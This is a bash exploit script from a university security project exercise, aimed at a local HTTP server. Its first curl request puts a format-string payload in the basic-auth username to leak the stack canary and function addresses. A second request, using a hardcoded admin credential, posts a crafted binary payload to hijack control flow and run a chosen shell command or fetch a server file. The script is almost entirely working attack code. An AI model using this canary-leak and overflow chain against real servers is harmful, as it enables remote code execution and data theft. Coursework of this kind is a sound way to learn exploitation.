#!/bin/bash

# Script for Ex. 5 of Security project 2 (YS13), by vissa-m harry-m aka soviet-UNION
# Usage: ./exploit.sh 2184 232 -1686176 "<SHELL CMD>"

# $1 = serve_ultimate offset from 'relative stack'
# $2 = 'relative stack' offset from post_data variable in post_param function
# $3 = send_file offset from relative stack
# $4 = file path you want to acquire from the server

# auth string for later post request (change according to server-testing cases) 
auth="YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==" # admin:bob's your uncle

# create the payload to get the canary and ultimate-response function address, using some python
payload="'$(python3 -c "print('%08x '*31)") :dsa'"

# use this request to get all the needed data (canary and the ultimate.html request function)
curl -v 'http://localhost:8000/' \
-u "${payload}" -p ""\
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' --compressed \
-H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'Cache-Control: max-age=0, no-cache' \
-H 'Origin: http://localhost:8000' \
-H 'Pragma: no-cache' 2> response.tmp

# so now we can get hex addresses exploiting the vuln from step 2
addresses="$(cat response.tmp | grep 'Invalid user:' | cut -d ':' -f 3 | sed s/\'// | sed s/\"//)"

# remove the file since its not needed anymore
rm -f response.tmp

# Now we will create the payload.bin file with python script
python3 exploit.py "$addresses" "$1" "$2" "$3" "$4"


curl -v 'http://localhost:8000/ultimate.html' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
--compressed \
-H 'Authorization: Basic '$auth \
-H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'Cache-Control: max-age=0, no-cache' \
-H 'Origin: http://localhost:8000' \
-H 'Pragma: no-cache' \
-H 'Content-Length: 10' \
--data-binary '@payload.bin' \
-m 5

rm payload.bin
